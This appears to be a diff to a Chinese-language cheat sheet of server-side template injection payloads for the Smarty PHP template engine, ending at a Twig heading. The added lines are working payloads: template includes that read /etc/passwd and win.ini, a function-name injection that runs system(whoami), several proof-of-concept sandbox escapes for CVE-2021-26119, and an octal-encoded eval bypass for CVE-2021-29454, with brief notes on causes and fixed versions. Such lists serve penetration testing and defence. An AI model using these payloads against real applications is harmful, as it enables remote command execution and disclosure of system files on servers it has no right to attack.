@@ -35,13 +35,53 @@ php:
 
 {self::getStreamVariable(“file:///etc/passwd”)}
 
+
+string:{include file='C:/Windows/win.ini'}
+
+
+
+string:{function name='x(){};system(whoami);function '}{/function}
+
+
+
 string:{$smarty.template->smarty->_getSmartyObj()->display('string:{system(whoami)}')}
 string:{$smarty.template_object->smarty->_getSmartyObj()->display('string:{system(whoami)}')}
 ```
+
+```
+CVE-2021-26119
+POC:
+string:{$smarty.template_object->smarty->_getSmartyObj()->display('string:{system(whoami)}')}
+string:{$smarty.template_object->smarty->enableSecurity()->display('string:{system(whoami)}')}
+string:{$smarty.template_object->smarty->disableSecurity()->display('string:{system(whoami)}')}
+string:{$smarty.template_object->smarty->addTemplateDir('./x')->display('string:{system(whoami)}')}
+string:{$smarty.template_object->smarty->setTemplateDir('./x')->display('string:{system(whoami)}')}
+string:{$smarty.template_object->smarty->addPluginsDir('./x')->display('string:{system(whoami)}')}
+string:{$smarty.template_object->smarty->setPluginsDir('./x')->display('string:{system(whoami)}')}
+string:{$smarty.template_object->smarty->setCompileDir('./x')->display('string:{system(whoami)}')}
+string:{$smarty.template_object->smarty->setCacheDir('./x')->display('string:{system(whoami)}')}
+
+漏洞原因：可以通过 {$smarty.template_object} 访问到 smarty 对象所导致
+```
+```
+CVE-2021-29454
+POC：
+eval:{math equation='("\163\171\163\164\145\155")("\167\150\157\141\155\151")'}
+漏洞原因：libs/plugins/function.math.php 中的 smarty_function_math 执行了 eval()，而 eval() 的数据可以通过 8 进制数字绕过正则表达式
+版本限制：在 3.1.42 和 4.0.2 中修复，小于这两个版本可用
+```
+
 <https://xz.aliyun.com/t/11108?time__1311=Cq0x2DgD0Q3xlEzIx7KD%3Dqi%3DDOU8QUfox#toc-6>
 
 
 
+
+
+
+
+
+
+^
 ## **twig常用的注入payload**
 php7.3
 ```
